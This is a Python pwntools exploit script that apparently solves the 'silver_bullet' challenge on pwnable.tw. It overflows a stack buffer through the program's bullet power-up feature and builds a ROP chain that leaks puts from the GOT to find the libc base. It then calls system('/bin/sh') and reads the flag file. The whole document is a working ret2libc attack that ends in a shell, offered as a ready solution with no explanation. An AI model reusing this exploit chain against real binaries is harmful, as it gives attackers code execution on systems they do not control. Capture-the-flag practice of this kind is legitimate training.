#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/silver_bullet'
REMOTE = ['chall.pwnable.tw', 10103]

PROG = ELF(LOCALE)
LIBC = ELF('./files/libc_32.so.6')

ENV = {'LD_PRELOAD': LIBC.path}
_LD = './files/ld-2.23.so'

context.binary = LOCALE
context.binary.checksec()
context.terminal = ['tmux', 'splitw', '-h']

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process([_LD, LOCALE], env=ENV)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################


def menu(option):
    p.sendlineafter('choice :', str(option))


def new(description):
    menu(1)
    p.sendafter('description of bullet :', description)
    p.recvline()


def powerup(description):
    menu(2)
    p.sendafter('another description of bullet :', description)
    p.recvline()


def beat():
    menu(3)
    p.recvuntil('Oh ! You win !!\n')


def beat_and_rop(*chain):
    n = 4 * len(chain)
    assert n < 48

    new('A' * n)
    powerup('U' * (48 - n))
    powerup('\xff' * 7 + ''.join(map(p32, chain)))

    beat()


MAIN = 0x08048954
PRINTF = 0x08048494
POP_POP_RET = 0x08048a7a # 0x08048a7a : pop edi ; pop ebp ; ret

with log.progress('Leaking libc base address') as l:
    l.status('Beating warewolf and leaking puts@got')
    beat_and_rop(PRINTF,  # ───────────────────────┐
                 POP_POP_RET,  # ──────────────────┼───────┐
                 context.binary.got['puts'],  # <──┘       │
                 0xdeadbeef,                  #            │
                 MAIN,  # <────────────────────────────────┘
                 0xdeadbeef,
                 0xdeadbeef )

    LEAK = p.recv(4)
    LIBC_BASE = u32(LEAK) - LIBC.symbols['puts']
    l.success(hex(LIBC_BASE))

SYSTEM = LIBC_BASE + LIBC.symbols['system']
BIN_SH = LIBC_BASE + LIBC.search('/bin/sh').next()

with log.progress('Executing system(/bin/sh)') as l:
    l.status('Beating warewolf and loading ropchain on stack')
    beat_and_rop(SYSTEM, 0xdeadbeef, BIN_SH, 0xdeadbeef, BIN_SH)

with log.progress('Reading flag') as l:
    p.sendline('cat /home/silver_bullet/flag')
    l.success(p.recvline().strip())

p.close()
